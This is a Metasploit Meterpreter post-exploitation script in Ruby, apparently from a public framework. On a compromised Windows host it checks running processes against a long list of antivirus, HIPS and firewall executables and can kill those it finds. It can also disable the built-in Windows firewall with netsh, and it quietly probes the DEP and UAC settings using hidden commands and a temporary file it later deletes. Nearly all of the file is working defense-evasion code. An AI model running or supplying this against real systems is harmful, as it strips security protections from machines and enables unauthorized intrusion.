#
# Meterpreter script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration.
# Provides also the option to kill the processes of detected products and disable the built-in firewall.
# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
# Version: 0.1.0
session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-k" => [ false, "Kill any AV, HIPS and Third Party Firewall process found." ],
	"-d" => [ false, "Disable built in Firewall" ]
)

def usage
	print_line("Getcountermeasure -- List (or optionally, kill) HIPS and AV")
	print_line("processes, show XP firewall rules, and display DEP and UAC")
	print_line("policies")
	print(@@exec_opts.usage)
	raise Rex::Script::Completed
end

#-------------------------------------------------------------------------------
avs = %W{
	a2adguard.exe
	a2adwizard.exe
	a2antidialer.exe
	a2cfg.exe
	a2cmd.exe
	a2free.exe
	a2guard.exe
	a2hijackfree.exe
	a2scan.exe
	a2service.exe
	a2start.exe
	a2sys.exe
	a2upd.exe
	aavgapi.exe
	aawservice.exe
	aawtray.exe
	ad-aware.exe
	ad-watch.exe
	alescan.exe
	anvir.exe
	ashdisp.exe
	ashmaisv.exe
	ashserv.exe
	ashwebsv.exe
	aswupdsv.exe
	atrack.exe
	avgagent.exe
	avgamsvr.exe
	avgcc.exe
	avgctrl.exe
	avgemc.exe
	avgnt.exe
	avgtcpsv.exe
	avguard.exe
	avgupsvc.exe
	avgw.exe
	avkbar.exe
	avk.exe
	avkpop.exe
	avkproxy.exe
	avkservice.exe
	avktray
	avktray.exe
	avkwctl
	avkwctl.exe
	avmailc.exe
	avp.exe
	avpm.exe
	avpmwrap.exe
	avsched32.exe
	avwebgrd.exe
	avwin.exe
	avwupsrv.exe
	avz.exe
	bdagent.exe
	bdmcon.exe
	bdnagent.exe
	bdss.exe
	bdswitch.exe
	blackd.exe
	blackice.exe
	blink.exe
	boc412.exe
	boc425.exe
	bocore.exe
	bootwarn.exe
	cavrid.exe
	cavtray.exe
	ccapp.exe
	ccevtmgr.exe
	ccimscan.exe
	ccproxy.exe
	ccpwdsvc.exe
	ccpxysvc.exe
	ccsetmgr.exe
	cfgwiz.exe
	cfp.exe
	clamd.exe
	clamservice.exe
	clamtray.exe
	cmdagent.exe
	cpd.exe
	cpf.exe
	csinsmnt.exe
	dcsuserprot.exe
	defensewall.exe
	defensewall_serv.exe
	defwatch.exe
	f-agnt95.exe
	fpavupdm.exe
	f-prot95.exe
	f-prot.exe
	fprot.exe
	fsaua.exe
	fsav32.exe
	f-sched.exe
	fsdfwd.exe
	fsm32.exe
	fsma32.exe
	fssm32.exe
	f-stopw.exe
	f-stopw.exe
	fwservice.exe
	fwsrv.exe
	iamstats.exe
	iao.exe
	icload95.exe
	icmon.exe
	idsinst.exe
	idslu.exe
	inetupd.exe
	irsetup.exe
	isafe.exe
	isignup.exe
	issvc.exe
	kav.exe
	kavss.exe
	kavsvc.exe
	klswd.exe
	kpf4gui.exe
	kpf4ss.exe
	livesrv.exe
	lpfw.exe
	mcagent.exe
	mcdetect.exe
	mcmnhdlr.exe
	mcrdsvc.exe
	mcshield.exe
	mctskshd.exe
	mcvsshld.exe
	mghtml.exe
	mpftray.exe
	msascui.exe
	mscifapp.exe
	msfwsvc.exe
	msgsys.exe
	msssrv.exe
	navapsvc.exe
	navapw32.exe
	navlogon.dll
	navstub.exe
	navw32.exe
	nisemsvr.exe
	nisum.exe
	nmain.exe
	noads.exe
	nod32krn.exe
	nod32kui.exe
	nod32ra.exe
	npfmntor.exe
	nprotect.exe
	nsmdtr.exe
	oasclnt.exe
	ofcdog.exe
	opscan.exe
	ossec-agent.exe
	outpost.exe
	paamsrv.exe
	pavfnsvr.exe
	pcclient.exe
	pccpfw.exe
	pccwin98.exe
	persfw.exe
	protector.exe
	qconsole.exe
	qdcsfs.exe
	rtvscan.exe
	sadblock.exe
	safe.exe
	sandboxieserver.exe
	savscan.exe
	sbiectrl.exe
	sbiesvc.exe
	sbserv.exe
	scfservice.exe
	sched.exe
	schedm.exe
	scheduler daemon.exe
	sdhelp.exe
	serv95.exe
	sgbhp.exe
	sgmain.exe
	slee503.exe
	smartfix.exe
	smc.exe
	snoopfreesvc.exe
	snoopfreeui.exe
	spbbcsvc.exe
	sp_rsser.exe
	spyblocker.exe
	spybotsd.exe
	spysweeper.exe
	spysweeperui.exe
	spywareguard.dll
	spywareterminatorshield.exe
	ssu.exe
	steganos5.exe
	stinger.exe
	swdoctor.exe
	swupdate.exe
	symlcsvc.exe
	symundo.exe
	symwsc.exe
	symwscno.exe
	tcguard.exe
	tds2-98.exe
	tds-3.exe
	teatimer.exe
	tgbbob.exe
	tgbstarter.exe
	tsatudt.exe
	umxagent.exe
	umxcfg.exe
	umxfwhlp.exe
	umxlu.exe
	umxpol.exe
	umxtray.exe
	usrprmpt.exe
	vetmsg9x.exe
	vetmsg.exe
	vptray.exe
	vsaccess.exe
	vsserv.exe
	wcantispy.exe
	win-bugsfix.exe
	winpatrol.exe
	winpatrolex.exe
	wrsssdk.exe
	xcommsvr.exe
	xfr.exe
	xp-antispy.exe
	zegarynka.exe
	zlclient.exe
}
#-------------------------------------------------------------------------------
# Check for the presence of AV, HIPS and Third Party firewall and/or kill the
# processes associated with it
def check(session,avs,killbit)
	print_status("Checking for contermeasures...")
	session.sys.process.get_processes().each do |x|
		if (avs.index(x['name'].downcase))
			print_status("\tPossible countermeasure found #{x['name']} #{x['path']}")
			if (killbit)
				print_status("\tKilling process for countermeasure.....")
				session.sys.process.kill(x['pid'])
			end
		end
	end
end
#-------------------------------------------------------------------------------
# Get the configuration and/or disable the built in Windows Firewall
def checklocalfw(session,killfw)
	print_status("Getting Windows Built in Firewall configuration...")
	opmode = ""
	r = session.sys.process.execute("cmd.exe /c netsh firewall show opmode", nil, {'Hidden' => 'true', 'Channelized' => true})
	while(d = r.channel.read)
		opmode << d
	end
	r.channel.close
	r.close
	opmode.split("\n").each do |o|
		print_status("\t#{o}")
	end
	if (killfw)
		print_status("Disabling Built in Firewall.....")
		f = session.sys.process.execute("cmd.exe /c netsh firewall set opmode mode=DISABLE", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = f.channel.read)
			if d =~ /The requested operation requires elevation./
				print_status("\tUAC or Insufficient permissions prevented the disabling of Firewall")
			end
		end
		f.channel.close
		f.close
	end
end
#-------------------------------------------------------------------------------
# Function for getting the current DEP Policy on the Windows Target
def checkdep(session)
	tmpout = ""
	depmode = ""
	# Expand environment %TEMP% variable
	tmp = session.fs.file.expand_path("%TEMP%")
	# Create random name for the wmic output
	wmicfile = sprintf("%.5d",rand(100000))
	wmicout = "#{tmp}\\#{wmicfile}"
	print_status("Checking DEP Support Policy...")
	r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmicout} OS Get DataExecutionPrevention_SupportPolicy", nil, {'Hidden' => true})
	sleep(2)
	r.close
	r = session.sys.process.execute("cmd.exe /c type #{wmicout}", nil, {'Hidden' => 'true','Channelized' => true})
		while(d = r.channel.read)
			tmpout << d
		end
	r.channel.close
	r.close
	session.sys.process.execute("cmd.exe /c del #{wmicout}", nil, {'Hidden' => true})
	depmode = tmpout.scan(/(\d)/)
	if depmode.to_s == "0"
		print_status("\tDEP is off for the whole system.")
	elsif depmode.to_s == "1"
		print_status("\tFull DEP coverage for the whole system with no exceptions.")
	elsif depmode.to_s == "2"
		print_status("\tDEP is limited to Windows system binaries.")
	elsif depmode.to_s == "3"
		print_status("\tDEP is on for all programs and services.")
	end

end
#-------------------------------------------------------------------------------
def checkuac(session)
	print_status("Checking if UAC is enabled ...")
	key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
	root_key, base_key = session.sys.registry.splitkey(key)
	value = "EnableLUA"
	open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
	v = open_key.query_value(value)
	if v.data == 1
		print_status("\tUAC is Enabled")
	else
		print_status("\tUAC is Disabled")
	end
end

################## MAIN ##################
killbt = false
killfw = false
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-k"
		killbt = true
	when "-d"
		killfw = true
	when "-h"
		usage
	end
}
# get the version of windows
if client.platform =~ /win32|win64/
	wnvr = session.sys.config.sysinfo["OS"]
	print_status("Running Getcountermeasure on the target...")
	check(session,avs,killbt)
	if wnvr !~ /Windows 2000/
		checklocalfw(session, killfw)
		checkdep(session)
	end
	if wnvr =~ /Windows Vista/
		checkuac(session)
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
